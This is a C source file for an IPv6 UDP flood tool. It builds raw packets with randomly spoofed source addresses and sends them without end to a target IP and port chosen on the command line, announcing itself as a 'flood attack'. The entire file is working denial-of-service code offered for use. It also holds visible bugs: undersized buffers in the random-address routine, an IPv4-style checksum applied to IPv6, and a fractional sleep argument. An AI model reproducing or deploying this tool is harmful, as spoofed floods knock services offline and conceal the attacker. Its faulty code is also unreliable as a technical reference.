#include <unistd.h>//for close()
#include<stdio.h>
#include<stdlib.h> 
#include<string.h> 
#include<arpa/inet.h> // for inet_ntoa()
#include <netinet/udp.h> // udp header
#include <time.h>
#include <linux/ipv6.h>
#include <time.h>
#include <unistd.h> // for usleep
#define D_TARGET_IP "::1"
#define D_TARGET_PORT 443



struct pseudo_udp
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t fill_with_zeros;
	u_int8_t protocol;
	u_int16_t udp_length;
};


unsigned short in_cksum (unsigned short *buf, int length)
{
   unsigned short *w = buf;
   int nleft = length;
   int sum = 0;
   unsigned short temp=0;

   /*
    * The algorithm uses a 32 bit accumulator (sum), adds
    * sequential 16 bit words to it, and at the end, folds back all 
    * the carry bits from the top 16 bits into the lower 16 bits.
    */
   while (nleft > 1)  {
       sum += *w++;
       nleft -= 2;
   }

   /* treat the odd byte at the end, if any */
   if (nleft == 1) {
        *(unsigned char *)(&temp) = *(unsigned char  *)w ;
        sum += temp;
   }

   /* add back carry outs from top 16 bits to low 16 bits */
   sum = (sum >> 16) + (sum & 0xffff);  // add hi 16 to low 16 
   sum += (sum >> 16);                  // add carry 
   return (unsigned short)(~sum);
}







void send_raw_ipv6_packet(char *buffer)
{
    //struct sockaddr_in dest_info;
    struct sockaddr_in6 dest_info;
    int enable = 1;
    
    int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_UDP);//create raw socket
    if(sock<0){
    	perror("[-] root privileges required ");
    	exit(1);
    	}
      

    if(setsockopt(sock, IPPROTO_IPV6, IPV6_HDRINCL,&enable, sizeof(enable))==-1)//socket option
      {
      	perror("setsockopt");
        exit(1);
        }
    //destination info
    struct ipv6hdr *ipv6 =(struct ipv6hdr *) buffer;
    dest_info.sin6_family= AF_INET6;//ip v6
    dest_info.sin6_port =0;
    dest_info.sin6_scope_id=0;
    dest_info.sin6_addr=ipv6->daddr;

    //send the packet
    if(sendto(sock, buffer, ntohs(ipv6->payload_len)+ sizeof(struct ipv6hdr), 0,(struct sockaddr *)&dest_info, sizeof(dest_info))==-1)
           {
           perror("sendto");
             exit(1);
           }
    close(sock);
}

char* rand_ipv6(){
    char* needed_size="ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff";
    char *buff=malloc(strlen(needed_size));
    char *str_buff=malloc(sizeof(int)+1);
    memset(buff,0,strlen(needed_size));
    for (int i = 0; i < 8; i++) {
      int rnd=rand()%65535;
      sprintf(str_buff, "%x",rnd);
      if (i != 7)
         strcat(str_buff, ":");
      strcat(buff + i, str_buff);
        }
    return buff;

}



int udp_ipv6(char* target_ip, int target_port)
{ 
    struct ipv6hdr *ipv6;
    struct udphdr* udp;
    while(1){
    char* rnd_src_ip=rand_ipv6();//random src
    char buffer[1500];
    memset(buffer,0,1500);
    char *udp_data;
    udp_data = buffer+ sizeof(struct udphdr) +sizeof(struct ipv6hdr);
    ipv6=  (struct ipv6hdr *) buffer;
    inet_pton(AF_INET6,rnd_src_ip,&ipv6->saddr);//spoofed src
    inet_pton(AF_INET6,target_ip,&ipv6->daddr);//spoofed src
    ipv6->version=6;//ipv6
    ipv6->hop_limit= 200;//random
    strcpy(udp_data,"flood UDP IPv6!\n");
    int data_len=strlen(udp_data);
    ipv6->payload_len=htons(sizeof(struct udphdr)+data_len);//payload without ip header len
    ipv6->nexthdr=IPPROTO_UDP;//udp
    udp=(struct udphdr*) (buffer+sizeof(struct ipv6hdr));
  //fill udp header
  udp->uh_sport=htons(rand()%6000);//src port
  udp->uh_dport=htons(target_port);
  udp->len=htons(sizeof(struct udphdr)+data_len);
  udp->check=htons(20);


  //checksum
  struct pseudo_udp ph;
    ph.source_address = inet_addr(rnd_src_ip);
	ph.dest_address =inet_addr(target_ip);
	ph.fill_with_zeros = 0;
	ph.protocol = IPPROTO_UDP;
	ph.udp_length = htons(sizeof(struct udphdr) + data_len);
    int size_for_chsum = sizeof(struct pseudo_udp) + sizeof(struct udphdr) + data_len;
	char *buf_for_chksum = malloc(size_for_chsum);
	memcpy(buf_for_chksum , (char*) &ph , sizeof (struct pseudo_udp));
	memcpy(buf_for_chksum + sizeof(struct pseudo_udp) , udp , sizeof(struct udphdr) + data_len);
	udp->check = in_cksum( (unsigned short*) buf_for_chksum , size_for_chsum);
    send_raw_ipv6_packet(buffer);
    free(rnd_src_ip);
    free(buf_for_chksum);
    usleep(0.00001);
    }
}

int main(int argc, char *argv[]){
  char *target_ip=D_TARGET_IP;
  int target_port=D_TARGET_PORT;
  for(int i=1;i<argc;i++)
  {
      if(strcmp(argv[i],"-t")==0)
      {
          if(i+1>=argc)
          {
            printf("[-] please enter a valid input\n");
            exit(EXIT_FAILURE);
          }
          target_ip=argv[i+1];
          i++;

      }
     else if(strcmp(argv[i],"-p")==0){
        if(i+1>=argc)
          {
            printf("[-] please enter a valid input\n");
            exit(EXIT_FAILURE);
          }
          target_port=atoi(argv[i+1]);
          i++;
     }
  }
    printf("[+] strating UDP ipv6 flood attack\n[+] to STOP the attack press crtl+c\n");
    printf("[+] dest ip is: %s\n[+] dest port is: %d\n",target_ip,target_port);
    udp_ipv6(target_ip,target_port);
  
    return 0;
}
 
